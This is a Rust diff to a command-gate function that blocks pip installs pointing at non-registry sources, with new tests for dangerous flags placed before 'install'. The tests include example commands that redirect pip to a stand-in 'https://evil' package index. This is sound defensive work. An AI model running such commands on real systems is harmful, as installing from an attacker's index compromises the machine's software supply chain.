@@ -915,30 +915,19 @@ fn pip_non_registry_shape(line: &str) -> Option<String> {
     ];
     let lower = line.to_lowercase();
     let words: Vec<&str> = lower.split_whitespace().collect();
-    for i in 0..words.len() {
-        if manager_from_token(words[i]) != Some(RefManager::Pip) {
-            continue;
-        }
-        // Anywhere after `pip install`, any dangerous flag is a hard deny —
-        // flags between install and the danger, or after a package name,
-        // must not dilute the signal. The manager token at `i` is inert
-        // here (never `install` nor dangerous), so scanning from it is
-        // the same verdict without index arithmetic.
-        let mut in_install = false;
-        for word in &words[i..] {
-            if *word == "install" || *word == "i" {
-                in_install = true;
-                continue;
-            }
-            if in_install
-                && DANGEROUS
-                    .iter()
-                    .any(|d| *word == *d || word.starts_with(&format!("{d}=")))
-            {
-                return Some(format!(
-                    "pip {word} names or redirects non-registry sources"
-                ));
-            }
+    let has_pip = words
+        .iter()
+        .any(|w| manager_from_token(w) == Some(RefManager::Pip));
+    let has_install = words.iter().any(|w| *w == "install" || *w == "i");
+    if !has_pip || !has_install {
+        return None;
+    }
+    for word in &words {
+        if DANGEROUS
+            .iter()
+            .any(|d| *word == *d || word.starts_with(&format!("{d}=")))
+        {
+            return Some(format!("pip {word} names or redirects non-registry sources"));
         }
     }
     None
@@ -2182,5 +2171,23 @@ mod tests {
         );
         assert!(gate_hard_denies("sudo pip install requests==1.0").is_empty());
         assert_eq!(gate_hard_denies("pip install -r requirements.txt").len(), 1);
+    }
+
+    #[test]
+    fn pip_gate_denies_dangerous_flags_before_install() {
+        assert_eq!(
+            gate_hard_denies("pip --index-url=https://evil install x").len(),
+            1
+        );
+        assert_eq!(
+            gate_hard_denies("pip -r reqs.txt install x").len(),
+            1
+        );
+        assert_eq!(
+            gate_hard_denies("pip --extra-index-url https://evil install requests").len(),
+            1
+        );
+        assert!(gate_hard_denies("pip install requests").is_empty());
+        assert!(gate_hard_denies("pip install requests==2.31.0").is_empty());
     }
 }
